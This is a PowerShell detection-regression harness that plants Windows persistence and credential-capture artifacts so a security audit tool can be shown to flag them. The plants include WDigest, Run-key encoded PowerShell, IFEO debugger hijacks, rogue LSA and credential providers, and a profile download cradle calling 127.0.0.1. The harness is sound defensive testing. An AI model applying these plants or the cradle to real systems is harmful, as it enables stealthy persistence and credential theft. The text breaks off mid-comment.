# detection_selftest.ps1 -- end-to-end detection regression harness.
#
# WHY: CI's full-run proves the audit COMPLETES; it never proved the audit
# DETECTS anything. Every false-clean in the code review shipped green because
# nothing planted a known-bad artifact and checked the verdict. This harness
# closes that gap: it plants a battery of indicators, runs the audit once, and
# asserts each expected finding appears in the report.
#
# TWO TIERS:
#   required -- detections that work today. A required case that STOPS firing
#               is a regression and FAILS the job (exit 1). Cases with
#               Invert=$true are FALSE-POSITIVE guards: they plant a benign
#               state and fail the job if the audit flags it anyway.
#   pending  -- gaps not yet closed. A pending case NEVER fails the job. When
#               a fix lands and the case starts passing, the harness says
#               "PROMOTE" -- move it to the required tier so it can never
#               regress again.
#
# History: the issue #138 gaps (Run-key backdoor eval, Guest-account verdict,
# IFEO escalation on non-accessibility binaries) were promoted to required on
# 2026-07-19 once persistence_eval.ps1 and the Section 2 SID -501 check
# landed. Exit code 8 on planted CRITICAL and the report-filename timestamp
# were promoted 2026-07-18. There are currently no pending cases.
#
# This is the safety net for the exit-code/finding-model rework: it lets that
# change proceed knowing the detections that work today keep working, and it
# is the running scoreboard of which gaps are still open.
#
# Windows only, requires admin (plants HKLM keys, edits the HOSTS file, toggles
# the Guest account). Every artifact is removed in the finally block, even on
# failure, so the runner is left clean. Windows PowerShell 5.1 compatible.
#
# Usage (from CI, on a real Windows runner):
#   powershell -NoProfile -ExecutionPolicy Bypass -File tests\detection_selftest.ps1 -BatPath .\doze_sec.bat

[CmdletBinding()]
param(
    [string]$BatPath = '.\doze_sec.bat',
    [string]$OutDir  = 'C:\SecurityAudit'
)

$ErrorActionPreference = 'Stop'

# A unique marker so planted artifacts are unmistakably ours and cleanup is safe.
$MARK      = 'dz_selftest_evil'
$hostsPath = Join-Path $env:SystemRoot 'System32\drivers\etc\hosts'
$wdigestKey = 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'
$runKey     = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$ifeoKey    = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe'
$sblKey     = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
$fpSvcName  = 'dz_selftest_fp_svc'
$fpSvcDir   = 'C:\Program Files\dz selftest fp'
$flagSvcName = 'dz_selftest_flag_svc'
$flagSvcBin  = 'C:\Users\Public\dz_selftest_flag_svc.exe'
$fwProfile   = 'Private'   # profile toggled by the disabled-firewall case
$script:fwPrevEnabled = $null
$defExclPath = 'C:\dz_selftest_excl_dir'   # Defender exclusion planted for Section 9
$startupDir  = [Environment]::GetFolderPath('Startup')   # localized-safe
$startupVbs  = Join-Path $startupDir ("{0}.vbs" -f $MARK)
$appcertKey  = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls'
$timeProvKey = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\$MARK"
# The audit always launches PowerShell with -NoProfile, so planting a profile
# cannot influence the audit itself -- it is inert test data on this runner.
$psProfDir   = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'WindowsPowerShell'
$psProfile   = Join-Path $psProfDir 'Microsoft.PowerShell_profile.ps1'
$psProfMade  = $false
# Logon/unlock persistence plants (Section 5, tools/logon_persistence.ps1)
$notifyKey   = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\dz_selftest_evil'
$npOrderKey  = 'HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order'
$npSvcKey    = 'HKLM:\SYSTEM\CurrentControlSet\Services\dz_selftest_np'
$script:npPrevOrder = $null
$cpGuid      = '{deadbeef-0000-0000-0000-00000000d123}'
$cpKey       = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\$cpGuid"
$cpClsidKey  = "HKLM:\SOFTWARE\Classes\CLSID\$cpGuid"
# Tier 2 logon/unlock plants
$lsaKey      = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$script:lsaPrevNotify = $null
$script:lsaPrevAuth = $null
$sethcIfeoKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
$scrDeskKey  = 'HKCU:\Control Panel\Desktop'
$script:scrPrev = $null
$envKey      = 'HKCU:\Environment'
# Tier 0 / advanced-actor round: fake unsigned kernel driver in a drop location
$drvPlant    = "C:\Users\Public\{0}.sys" -f $MARK
# Covert-monitoring: an account hidden from the sign-in screen (T1564.002).
$userListKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
# AppInit_DLLs injection (T1546.010) and HKCU COM CLSID hijack (T1546.015).
$appInitKey  = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'
$script:appInitPrev = $null
$comKey      = 'HKCU:\Software\Classes\CLSID\{dead1111-0000-0000-0000-00000000c015}'
# NOTE: the COM check ignores any InprocServer32 path containing Windows/
# System32/Microsoft, so the planted DLL path must be neutral (Public), which is
# also a staging path the check treats as suspicious.
$comDll      = 'C:\Users\Public\dz_selftest_evil_com.dll'
# Baseline/diff: the audit auto-diffs when a snapshot exists at OUTDIR. The
# harness seeds one BEFORE the audit runs, with the planted Run-key backdoor
# deliberately absent from it, so the audit's diff must report that autorun as
# NEW -- proving end-to-end wiring the isolated helpers test cannot cover.
$baselineFile = Join-Path $OutDir 'baseline.snapshot'

# Each case: Name, Tier, Plant/Cleanup script blocks, and Expect -- a regex that
# must appear in the final report text for the detection to count as firing.
$cases = @(
    @{
        Name   = 'WDigest UseLogonCredential=1 -> CRITICAL (plaintext creds in RAM)'
        Attack = @('T1003.001')
        Tier   = 'required'
        Expect = 'WDigest ENABLED'
        Plant  = { New-Item -Path $wdigestKey -Force | Out-Null
                   Set-ItemProperty -Path $wdigestKey -Name UseLogonCredential -Value 1 -Type DWord -Force }
        Cleanup= { Remove-ItemProperty -Path $wdigestKey -Name UseLogonCredential -EA SilentlyContinue }
    },
    @{
        Name   = 'HOSTS entry mapping a domain to a public IP -> WARNING (DNS hijack)'
        Tier   = 'required'
        Expect = 'Non-standard entries found in HOSTS'
        Plant  = { Add-Content -LiteralPath $hostsPath -Value ("203.0.113.5 {0}.example" -f $MARK) }
        Cleanup= { $keep = Get-Content -LiteralPath $hostsPath | Where-Object { $_ -notmatch $MARK }
                   Set-Content -LiteralPath $hostsPath -Value $keep -Encoding ASCII }
    },
    @{
        Name   = 'Run-key backdoor (encoded PowerShell) -> flagged as suspicious'
        Attack = @('T1547.001')
        Tier   = 'required'  # persistence_eval.ps1 evaluates Run keys (issue #138)
        Expect = ('(?im)(\[(WARNING|CRITICAL)\][^\r\n]*{0}|{0}[^\r\n]*(suspicious|encoded|backdoor))' -f $MARK)
        Plant  = { if (-not (Test-Path $runKey)) { New-Item -Path $runKey -Force | Out-Null }
                   Set-ItemProperty -Path $runKey -Name $MARK -Value 'powershell -w hidden -enc ZQBjAGgAbwA=' -Force }
        Cleanup= { Remove-ItemProperty -Path $runKey -Name $MARK -EA SilentlyContinue }
    },
    @{
        Name   = 'IFEO Debugger on a NON-accessibility binary (notepad) -> escalated'
        Tier   = 'required'  # persistence_eval.ps1 escalates ANY IFEO Debugger (issue #138)
        Expect = '(?im)IFEO Debugger hijack[^\r\n]*notepad'
        Plant  = { New-Item -Path $ifeoKey -Force | Out-Null
                   Set-ItemProperty -Path $ifeoKey -Name Debugger -Value 'cmd.exe' -Force }
        Cleanup= { Remove-Item -Path $ifeoKey -Recurse -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'Startup-folder script autorun -> flagged (T1547.001)'
        Attack = @('T1547.001')
        Tier   = 'required'  # startup_eval.ps1; same dump-without-verdict class as #138
        Expect = ('(?im)\[(WARNING|CRITICAL)\] Startup item [^\r\n]*{0}' -f $MARK)
        Plant  = { Set-Content -LiteralPath $startupVbs -Value "WScript.Echo ""$MARK""" -Encoding ASCII }
        Cleanup= { Remove-Item -LiteralPath $startupVbs -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'AppCert DLL registered -> flagged (T1546.009)'
        Attack = @('T1546.009')
        Tier   = 'required'  # startup_eval.ps1; uncovered sibling of AppInit_DLLs
        Expect = ('(?im)\[(WARNING|CRITICAL)\] AppCert DLL [^\r\n]*{0}' -f $MARK)
        Plant  = { if (-not (Test-Path $appcertKey)) { New-Item -Path $appcertKey -Force | Out-Null }
                   Set-ItemProperty -Path $appcertKey -Name $MARK -Value 'C:\Windows\Temp\dz_selftest_evil.dll' -Force }
        Cleanup= { Remove-ItemProperty -Path $appcertKey -Name $MARK -EA SilentlyContinue }
    },
    @{
        Name   = 'Unsigned kernel driver in a drop location -> flagged (BYOVD/T1562.001)'
        Attack = @('T1562.001', 'T1068')
        Tier   = 'required'  # driver_audit.ps1; signature catch-all -- renaming cannot evade
        Expect = ('(?im)\[(WARNING|CRITICAL)\] Driver [^\r\n]*{0}\.sys' -f $MARK)
        Plant  = { Set-Content -LiteralPath $drvPlant -Value 'MZ not-a-real-driver' -Encoding ASCII }
        Cleanup= { Remove-Item -LiteralPath $drvPlant -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'Account hidden from the sign-in screen -> flagged (T1564.002)'
        Attack = @('T1564.002', 'T1564')
        Tier   = 'required'  # stalkerware_check.ps1; covert-monitoring path
        Expect = ('(?im)\[(WARNING|CRITICAL)\][^\r\n]*HIDDEN[^\r\n]*{0}' -f $MARK)
        Plant  = { if (-not (Test-Path $userListKey)) { New-Item -Path $userListKey -Force | Out-Null }
                   Set-ItemProperty -Path $userListKey -Name $MARK -Value 0 -Type DWord -Force }
        Cleanup= { Remove-ItemProperty -Path $userListKey -Name $MARK -EA SilentlyContinue }
    },
    @{
        Name   = 'AppInit_DLLs set -> flagged (T1546.010)'
        Attack = @('T1546.010')
        Tier   = 'required'  # emulation corpus; DLL injected into every GUI process
        Expect = '(?im)\[CRITICAL\] AppInit_DLLs is set \(T1546\.010\)'
        Plant  = { $script:appInitPrev = (Get-ItemProperty -Path $appInitKey -Name 'AppInit_DLLs' -EA SilentlyContinue).AppInit_DLLs
                   Set-ItemProperty -Path $appInitKey -Name 'AppInit_DLLs' -Value $comDll -Force }
        Cleanup= { if ($null -ne $script:appInitPrev) { Set-ItemProperty -Path $appInitKey -Name 'AppInit_DLLs' -Value $script:appInitPrev -Force }
                   else { Set-ItemProperty -Path $appInitKey -Name 'AppInit_DLLs' -Value '' -Force } }
    },
    @{
        Name   = 'HKCU COM CLSID InprocServer32 hijack -> flagged (T1546.015)'
        Attack = @('T1546.015')
        Tier   = 'required'  # emulation corpus; userland COM persistence
        Expect = '(?im)\[T1546\.015\][\s\S]{0,800}dz_selftest_evil_com'
        Plant  = { New-Item -Path "$comKey\InprocServer32" -Force | Out-Null
                   Set-ItemProperty -Path "$comKey\InprocServer32" -Name '(default)' -Value $comDll -Force }
        Cleanup= { Remove-Item -Path $comKey -Recurse -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'Accessibility IFEO hijack on sethc.exe -> flagged (T1546.008)'
        Attack = @('T1546.008')
        Tier   = 'required'  # emulation corpus; nation-state login-screen backdoor
        Expect = '(?im)\[CRITICAL\] IFEO Debugger hijack: sethc\.exe'
        Plant  = { New-Item -Path $sethcIfeoKey -Force | Out-Null
                   Set-ItemProperty -Path $sethcIfeoKey -Name 'Debugger' -Value 'cmd.exe' -Force }
        Cleanup= { Remove-Item -Path $sethcIfeoKey -Recurse -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'Rogue LSA Authentication package -> flagged (T1547.002)'
        Attack = @('T1547.002')
        Tier   = 'required'  # emulation corpus; sibling of the LSA Notification plant
        Expect = "(?im)LSA Authentication Packages package 'dz_selftest_authpkg'"
        Plant  = { $cur = @((Get-ItemProperty -Path $lsaKey -Name 'Authentication Packages' -EA Stop).'Authentication Packages')
                   $script:lsaPrevAuth = $cur
                   Set-ItemProperty -Path $lsaKey -Name 'Authentication Packages' -Value ($cur + 'dz_selftest_authpkg') -Type MultiString -Force }
        Cleanup= { if ($null -ne $script:lsaPrevAuth) { Set-ItemProperty -Path $lsaKey -Name 'Authentication Packages' -Value $script:lsaPrevAuth -Type MultiString -Force } }
    },
    @{
        Name   = 'Time provider DLL registered -> flagged (T1547.003)'
        Attack = @('T1547.003')
        Tier   = 'required'  # persistence_extra.ps1; W32Time loads these as SYSTEM
        # Planting the subkey is inert: W32Time only loads providers when the
        # service starts, and the harness never restarts it.
        Expect = ('(?im)\[(WARNING|CRITICAL)\] Time provider [^\r\n]*{0}' -f $MARK)
        Plant  = { New-Item -Path $timeProvKey -Force | Out-Null
                   Set-ItemProperty -Path $timeProvKey -Name 'DllName' -Value 'C:\Windows\Temp\dz_selftest_evil.dll' -Force }
        Cleanup= { Remove-Item -LiteralPath $timeProvKey -Recurse -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'PowerShell profile with a download cradle -> flagged (T1546.013)'
        Attack = @('T1546.013')
        Tier   = 'required'  # persistence_extra.ps1; content is judged, not existence
        Expect = '(?im)\[(WARNING|CRITICAL)\] PowerShell profile [^\r\n]*'
        Plant  = { if (-not (Test-Path $psProfDir)) { New-Item -ItemType Directory -Path $psProfDir -Force | Out-Null }
                   # Only plant when the user has no profile of their own, so a
                   # real profile on a dev box is never overwritten by the test.
                   if (-not (Test-Path -LiteralPath $psProfile)) {
                       Set-Content -LiteralPath $psProfile -Value "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/$MARK')" -Encoding ASCII
                       $script:psProfMade = $true
                   } }
        Cleanup= { if ($script:psProfMade) { Remove-Item -LiteralPath $psProfile -Force -EA SilentlyContinue } }
    },
    @{
        Name   = 'Guest account enabled -> WARNING'
        Attack = @('T1078.001')
        Tier   = 'required'  # Section 2 now emits a SID -501 verdict (issue #138)
        Expect = '(?im)\[(WARNING|CRITICAL)\][^\r\n]*guest'
        Plant  = { & net user guest /active:yes | Out-Null }
        Cleanup= { & net user guest /active:no  | Out-Null }
    },
    @{
        Name   = 'netsh portproxy rule active -> WARNING (Volt Typhoon C2 tunnel IOC)'
        Attack = @('T1090')
        Tier   = 'required'
        Expect = '(?im)\[WARNING\] netsh portproxy rules ACTIVE'
        Plant  = { $r = & netsh interface portproxy add v4tov4 listenport=53219 listenaddress=127.0.0.1 connectport=80 connectaddress=127.0.0.1
                   if ($LASTEXITCODE -ne 0) { throw ("netsh portproxy add failed: {0}" -f ($r -join ' ')) } }
        Cleanup= { & netsh interface portproxy delete v4tov4 listenport=53219 listenaddress=127.0.0.1 | Out-Null }
    },
    # ---- Section-verdict unmasking (exit-code rework, review W1) ----
    # Verdicts were derived from EXIT_CODE deltas; because the code saturates
    # at 2, every section after the first finding printed "CLEAN" even when it
    # found something. Verdicts now count findings per section, so BOTH the
    # HOSTS section (3) and the portproxy section (17) must report ISSUES
    # FOUND in the same run. No plant of their own -- they piggyback on the
    # HOSTS and portproxy artifacts planted above.
    @{
        Name   = 'Section 3 verdict reflects the HOSTS finding (verdict unmasking)'
        Tier   = 'required'
        Expect = '\[SECTION 3/18 RESULT: ISSUES FOUND'
        Plant  = { }
        Cleanup= { }
    },
    @{
        Name   = 'Section 17 verdict reflects the portproxy finding (verdict unmasking)'
        Tier   = 'required'
        Expect = '\[SECTION 17/18 RESULT: ISSUES FOUND'
        Plant  = { }
        Cleanup= { }
    },
    # ---- False-positive guards: plant a BENIGN state, assert NOT flagged ----
    @{
        Name   = 'Benign signed shortcut in Startup -> must NOT be flagged (FP guard)'
        Tier   = 'required'
        Invert = $true       # legit installers drop shortcuts here constantly
        # A .lnk to the Microsoft-signed notepad.exe is exactly what OneDrive /
        # Teams / vendor updaters look like. Flagging it would make the new
        # Startup check unusable on real machines.
        Expect = ('(?im)\[(WARNING|CRITICAL)\] Startup item [^\r\n]*{0}_benign' -f $MARK)
        Plant  = { $sh = New-Object -ComObject WScript.Shell
                   $lnk = $sh.CreateShortcut((Join-Path $startupDir ("{0}_benign.lnk" -f $MARK)))
                   $lnk.TargetPath = (Join-Path $env:SystemRoot 'System32\notepad.exe')
                   $lnk.Save()
                   [void][Runtime.InteropServices.Marshal]::ReleaseComObject($sh) }
        Cleanup= { Remove-Item -LiteralPath (Join-Path $startupDir ("{0}_benign.lnk" -f $MARK)) -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'ScriptBlockLogging ON -> audit must NOT flag its own AMSI scan'
        Tier   = 'required'
        Invert = $true       # regex must be ABSENT from the report
        # With 4104 logging on, the audit's own script blocks contain the AMSI
        # pattern list; without the self-exclusion filter the CTI section
        # reported the audit itself as an AMSI bypass on every hardened host.
        Expect = '(?im)\[WARNING\]\[T1562\.001\] AMSI bypass attempts'
        Plant  = { New-Item -Path $sblKey -Force | Out-Null
                   Set-ItemProperty -Path $sblKey -Name EnableScriptBlockLogging -Value 1 -Type DWord -Force }
        Cleanup= { Remove-ItemProperty -Path $sblKey -Name EnableScriptBlockLogging -EA SilentlyContinue }
    },
    @{
        Name   = 'Signed service at unquoted spaced path -> must NOT be "no-file"'
        Tier   = 'required'
        Invert = $true
        # The old parser split the unquoted PathName at the first space
        # ("C:\Program"), failed to find the binary, and reported signed
        # vendor services as no-file. (The unquoted path itself is still
        # legitimately listed by the unquoted-service-path check.)
        Expect = ('(?im){0}[^\r\n]*no-file' -f $fpSvcName)
        Plant  = { New-Item -ItemType Directory -Path $fpSvcDir -Force | Out-Null
                   Copy-Item (Join-Path $env:SystemRoot 'System32\cmd.exe') (Join-Path $fpSvcDir 'dzsvc.exe') -Force
                   $r = & sc.exe create $fpSvcName 'binPath=' "$fpSvcDir\dzsvc.exe" 'start=' 'demand'
                   if ($LASTEXITCODE -ne 0) { throw ("sc create failed: {0}" -f ($r -join ' ')) } }
        Cleanup= { & sc.exe delete $fpSvcName | Out-Null
                   Remove-Item -LiteralPath $fpSvcDir -Recurse -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'Flagged service (bad path) drives Section 7 verdict to ISSUES FOUND (wiring)'
        Attack = @('T1543.003', 'T1543')
        Tier   = 'required'
        # A service binary under \Users\Public\ is flagged by
        # service_signature_check.ps1 (bad-path). Before the fix, the helper's
        # [WARNING] never incremented FINDINGS, so Section 7's verdict read
        # CLEAN and the exit code was unaffected. Assert the verdict now flips.
        Expect = '\[SECTION 7/18 RESULT: ISSUES FOUND'
        Plant  = { Copy-Item (Join-Path $env:SystemRoot 'System32\cmd.exe') $flagSvcBin -Force
                   $r = & sc.exe create $flagSvcName 'binPath=' $flagSvcBin 'start=' 'demand'
                   if ($LASTEXITCODE -ne 0) { throw ("sc create failed: {0}" -f ($r -join ' ')) } }
        Cleanup= { & sc.exe delete $flagSvcName | Out-Null
                   Remove-Item -LiteralPath $flagSvcBin -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'Benign hidden-window autorun -> must NOT be flagged (FP guard)'
        Tier   = 'required'
        Invert = $true
        # A legitimate updater that runs "-WindowStyle Hidden -File <path>" with
        # no download/encode token must NOT trip persistence_eval. Before the fix,
        # bare "-w hidden" (and bare "iex") flagged such autoruns.
        Expect = ('(?im)Suspicious Run-key autorun[^\r\n]*{0}_benign' -f $MARK)
        Plant  = { if (-not (Test-Path $runKey)) { New-Item -Path $runKey -Force | Out-Null }
                   Set-ItemProperty -Path $runKey -Name ("{0}_benign" -f $MARK) -Value 'powershell -WindowStyle Hidden -File "C:\Program Files\Vendor\update.ps1"' -Force }
        Cleanup= { Remove-ItemProperty -Path $runKey -Name ("{0}_benign" -f $MARK) -EA SilentlyContinue }
    },
    @{
        Name   = 'Disabled firewall profile -> summary reports DISABLED (enum-robust)'
        Attack = @('T1562.004')
        Tier   = 'required'
        # Get-NetFirewallProfile.Enabled is a GpoBoolean enum; the summary must
        # classify a disabled profile as off. The harness previously only ever
        # planted the all-enabled state, so the disabled path went untested.
        Expect = 'Firewall DISABLED on'
        Plant  = { $script:fwPrevEnabled = (Get-NetFirewallProfile -Profile $fwProfile).Enabled
                   Set-NetFirewallProfile -Profile $fwProfile -Enabled False }
        # Cleanup restores the profile to ENABLED unconditionally, and never to
        # the state observed at plant time. If a previous interrupted run left
        # the profile off, "restore what I saw" would record off as the normal
        # state and cement it -- a test harness silently leaving a machine with
        # its firewall down. Turning a firewall back on can only over-protect;
        # a developer who deliberately disabled theirs can disable it again,
        # and the message below tells them it happened.
        Cleanup= { Set-NetFirewallProfile -Profile $fwProfile -Enabled True
                   if ("$script:fwPrevEnabled" -ne 'True') {
                       Write-Host ("  NOTE: {0} firewall profile read as '{1}' before this run and has been left ENABLED." -f $fwProfile, $script:fwPrevEnabled)
                   } }
    },
    @{
        Name   = 'Defender path exclusion -> Section 9 verdict ISSUES FOUND (Div-1 wiring)'
        Tier   = 'required'
        # A Defender path exclusion (T1562.001, AV-blinding) emits [WARNING] in
        # Section 9 but never incremented FINDINGS, so the section verdict read
        # CLEAN. Assert it now flips. (If Defender is unavailable on the runner,
        # Add-MpPreference throws and the harness SKIPs the case -- not a
        # regression -- because Get-MpPreference would then also be unavailable.)
        Expect = '\[SECTION 9/18 RESULT: ISSUES FOUND'
        MaySkip = 'Defender is not available on this host (Server Core, or a third-party AV owns protection), so Add-MpPreference cannot plant an exclusion'
        Plant  = { Add-MpPreference -ExclusionPath $defExclPath -EA Stop }
        Cleanup= { Remove-MpPreference -ExclusionPath $defExclPath -EA SilentlyContinue }
    },
    @{
        Name   = 'Winlogon Notify package -> flagged (logon/unlock persistence)'
        Attack = @('T1547.004')
        Tier   = 'required'
        Expect = '(?im)Winlogon Notify subkey[^\r\n]*dz_selftest_evil'
        Plant  = { New-Item -Path $notifyKey -Force | Out-Null
                   Set-ItemProperty -Path $notifyKey -Name DllName -Value 'C:\Users\Public\dz_evil_notify.dll' -Force }
        Cleanup= { Remove-Item -Path $notifyKey -Recurse -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'Rogue Network Provider (NPPSPY) -> flagged (cleartext cred capture)'
        Attack = @('T1556.008')
        Tier   = 'required'
        Expect = '(?im)network provider .?dz_selftest_np'
        Plant  = { $script:npPrevOrder = (Get-ItemProperty -Path $npOrderKey -Name ProviderOrder -EA Stop).ProviderOrder
                   Set-ItemProperty -Path $npOrderKey -Name ProviderOrder -Value ($script:npPrevOrder + ',dz_selftest_np') -Force
                   New-Item -Path ("{0}\NetworkProvider" -f $npSvcKey) -Force | Out-Null
                   Set-ItemProperty -Path ("{0}\NetworkProvider" -f $npSvcKey) -Name ProviderPath -Value 'C:\Users\Public\dz_evil_np.dll' -Force }
        Cleanup= { if ($null -ne $script:npPrevOrder) { Set-ItemProperty -Path $npOrderKey -Name ProviderOrder -Value $script:npPrevOrder -Force }
                   Remove-Item -Path $npSvcKey -Recurse -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'Rogue Credential Provider DLL -> flagged (logon/unlock capture)'
        Attack = @('T1547')
        Tier   = 'required'
        Expect = '(?im)Credential provider [^\r\n]*deadbeef'
        Plant  = { New-Item -Path $cpKey -Force | Out-Null
                   New-Item -Path ("{0}\InprocServer32" -f $cpClsidKey) -Force | Out-Null
                   Set-ItemProperty -Path ("{0}\InprocServer32" -f $cpClsidKey) -Name '(default)' -Value 'C:\Users\Public\dz_evil_cp.dll' -Force }
        Cleanup= { Remove-Item -Path $cpKey -Recurse -Force -EA SilentlyContinue
                   Remove-Item -Path $cpClsidKey -Recurse -Force -EA SilentlyContinue }
    },
    @{
        Name   = 'Rogue LSA Notification package -> flagged (lsass credential capture)'
        Attack = @('T1556.002')
        Tier   = 'required'
        Expect = "(?im)LSA Notification Packages package 'dz_selftest_lsa'"
        # Inert until reboot (lsass only re-reads at boot); restored in cleanup.
        Plant  = { $cur = @((Get-ItemProperty -Path $lsaKey -Name 'Notification Packages' -EA Stop).'Notification Packages')
                   $script:lsaPrevNotify = $cur
                   Set-ItemProperty -Path $lsaKey -Name 'Notification Packages' -Value ($cur + 'dz_selftest_lsa') -Type MultiString -Force }
        Cleanup= { if ($null -ne $script:lsaPrevNotify) { Set-ItemProperty -Path $lsaKey -Name 'Notification Packages' -Value $script:lsaPrevNotify -Type MultiString -Force } }
    },
    @{
        Name   = 'Malicious screensaver (SCRNSAVE.EXE staging path) -> flagged'
        Attack = @('T1546.002')
        Tier   = 'required'
        Expect = '(?im)Screensaver SCRNSAVE\.EXE -> C:\\Users\\Public\\dz_evil\.scr'
        Plant  = { $script:scrPrev = (Get-ItemProperty -Path $scrDeskKey -Name 'SCRNSAVE.EXE' -EA SilentlyContinue).'SCRNSAVE.EXE'
                   Set-ItemProperty -Path $scrDeskKey -Name 'SCRNSAVE.EXE' -Value 'C:\Users\Public\dz_evil.scr' -Force }
        Cleanup= { if ($script:scrPrev) { Set-ItemProperty -Path $scrDeskKey -Name 'SCRNSAVE.EXE' -Value $script:scrPrev -Force }
                   else { Remove-ItemProperty -Path $scrDeskKey -Name 'SCRNSAVE.EXE' -EA SilentlyContinue } }
    },
    @{
        Name   = 'UserInitMprLogonScript logon script -> flagged'
        Attack = @('T1037.001')
        Tier   = 'required'
        Expect = '(?im)UserInitMprLogonScript is set'
        Plant  = { Set-ItemProperty -Path $envKey -Name UserInitMprLogonScript -Value 'C:\Users\Public\dz_evil.bat' -Force }
        Cleanup= { Remove-ItemProperty -Path $envKey -Name UserInitMprLogonScript -EA SilentlyContinue }
    }
)

function Get-LatestReport {
    param([string]$Dir)
    Get-ChildItem -LiteralPath $Dir -Filter 'SecurityReport_*.txt' -EA SilentlyContinue |
        Sort-Object LastWriteTime -Descending | Select-Object -First 1
}

$planted = @()
$runExit = $null
try {
    # Capture a REAL baseline BEFORE planting, so the audit's automatic diff
    # sees exactly the planted artifacts as NEW. Calling the tool directly
    # (rather than running the whole audit with -baseline) keeps the harness to
    # one audit run while still exercising the real snapshot format.
    Write-Host "== Seeding baseline (pre-plant state) =="
    try {
        if (-not (Test-Path -LiteralPath $OutDir)) { New-Item -ItemType Directory -Path $OutDir -Force | Out-Null }
        $bl = Join-Path (Split-Path -Parent $PSCommandPath) '..\tools\baseline_diff.ps1'
        & $bl -Mode Save -Path $baselineFile -MarkerDir $env:TEMP | Out-Null
        $blRecs = @(Get-Content -LiteralPath $baselineFile -EA SilentlyContinue | Where-Object { $_ -notmatch '^#' }).Count
        Write-Host ("  baseline captured: {0} record(s)" -f $blRecs)
    } catch {
        Write-Host ("  WARNING: baseline seed failed: {0}" -f $_.Exception.Message)
    }

    # Plant per-case with a catch so one bad plant cannot abort the whole run
    # (and only cases that actually planted get asserted / cleaned up).
    Write-Host "== Planting known-bad artifacts =="
    foreach ($c in $cases) {
        # Register for cleanup BEFORE planting, not after. A multi-step plant
        # that throws halfway (New-Item succeeds, Set-ItemProperty fails) has
        # already changed the machine; recording it only on success meant the
        # finally block skipped exactly the cases that left debris behind. The
        # cleanups are all idempotent -EA SilentlyContinue removals, so running
        # one for a plant that never happened is harmless.
        $planted += $c
        try {
            & $c.Plant
            $c.Planted = $true
            Write-Host ("  planted: {0}" -f $c.Name)
        } catch {
            $c.Planted = $false
            Write-Host ("  WARNING: could not plant [{0}] {1}: {2}" -f $c.Tier, $c.Name, $_.Exception.Message)
        }
    }

    Write-Host "== Running the audit (this takes a few minutes) =="
    # PowerShell launches the .bat directly and captures its exit code in
    # $LASTEXITCODE (no cmd /c quoting hazard). -noConsoleLog skips the
    # self-tee re-exec so the exit code is the audit's own, not Tee-Object's.
    & $BatPath -dev -sdu -nosrp -resetTTP -noConsoleLog | Out-Null
    $runExit = $LASTEXITCODE
    Write-Host ("  audit exit code: {0}" -f $runExit)

    $report = Get-LatestReport -Dir $OutDir
    if (-not $report) { Write-Host "FAIL: no SecurityReport_*.txt produced"; exit 1 }
    $text = Get-Content -LiteralPath $report.FullName -Raw
    Write-Host ("  report: {0}" -f $report.FullName)

    # REQUIRED (Option B PR 2): converted sites must append to the ledger. The
    # HOSTS finding (Section 3) is planted every run, so the ledger must exist
    # and carry a WARNING|3| entry -- proving the :dz_finding plumbing works.
    $ledger = Get-ChildItem -LiteralPath $OutDir -Filter 'SecurityReport_*.ledger' -EA SilentlyContinue |
        Sort-Object LastWriteTime -Descending | Select-Object -First 1
    $badLedger = $true
    if ($ledger) {
        $lg = @(Get-Content -LiteralPath $ledger.FullName -EA SilentlyContinue)
        # Converted sites that are reliably triggered by planted artifacts must
        # each appear as a ledger entry: HOSTS (3, PR2), persistence (5, PR3),
        # portproxy (17, PR3). Proves the :dz_finding conversions populate it.
        $has3  = [bool](@($lg | Where-Object { $_ -like 'WARNING|3|*'  }).Count)
        $has5  = [bool](@($lg | Where-Object { $_ -like 'WARNING|5|*'  }).Count)
        $has17 = [bool](@($lg | Where-Object { $_ -like 'WARNING|17|*' }).Count)
        $badLedger = -not ($has3 -and $has5 -and $has17)
    }

    # REQUIRED: the report filename must carry a real timestamp. On wmic-less
    # systems (Win11 24H2+/Server 2025) the old fallback produced garbage like
    # "SecurityReport_ =_.txt"; the wildcard match above would happily accept
    # that, so assert the shape explicitly. (NODATE_* is the script's
    # last-ditch fallback for a broken PowerShell -- on this runner PowerShell
    # provably works, so NODATE here would also be a regression.)
    $badName = $report.Name -notmatch '^SecurityReport_\d{8}_\d{6}\.txt$'

    # REQUIRED: the exit handler must report a non-zero findings count when
    # findings were planted -- this is the accumulator the section verdicts
    # and exit code now read from.
    $badFind = $text -notmatch '(?m)^\s*FINDINGS COUNTED: [1-9]'

    # REQUIRED: the end-of-run exit-8 escalation note must NOT be emitted as a
    # [CRITICAL] line. The planted WDigest CRITICAL drives exit 8, so the note
    # is emitted this run; if it carries a [CRITICAL] token, top_findings.ps1
    # (which collects ^\s*\[(CRITICAL|WARNING)\]) re-lists it as a phantom
